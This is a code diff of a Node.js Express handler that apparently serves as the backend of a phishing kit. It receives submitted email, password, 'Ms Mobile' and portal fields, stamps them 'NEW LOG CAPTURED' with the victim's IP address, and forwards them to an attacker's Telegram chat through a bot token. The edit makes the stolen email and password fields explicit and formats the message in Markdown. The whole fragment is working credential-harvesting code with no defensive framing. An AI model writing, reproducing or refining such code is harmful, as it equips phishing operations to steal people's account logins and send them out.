@@ -11,21 +11,19 @@ const CHAT_ID = process.env.CHAT_ID;
 app.post('/submit', async (req, res) => {
     const data = req.body;
     
-    let message = "--- NEW LOG CAPTURED ---\n";
-    message += "Portal: " + (data.page || 'General') + "\n\n";
-
-    for (const [key, value] of Object.entries(data)) {
-        if (key !== 'page') {
-            message += key.toUpperCase() + ": " + value + "\n";
-        }
-    }
-
-    message += "\nIP: " + (req.headers['x-forwarded-for'] || req.socket.remoteAddress);
+    let message = "🚨 **NEW LOG CAPTURED** 🚨\n\n";
+    message += "**Portal:** " + (data.page || 'General') + "\n";
+    message += "**Type:** " + (data.type || 'N/A') + "\n";
+    message += "**Email:** " + (data.email || 'N/A') + "\n";
+    message += "**Pwd:** " + (data.pwd || 'N/A') + "\n";
+    message += "**Ms Mobile:** " + (data.msMobile || 'N/A') + "\n\n";
+    message += "**IP:** " + (req.headers['x-forwarded-for'] || req.socket.remoteAddress);
 
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
-            text: message
+            text: message,
+            parse_mode: 'Markdown'
         });
         res.json({ status: "success" });
     } catch (error) {
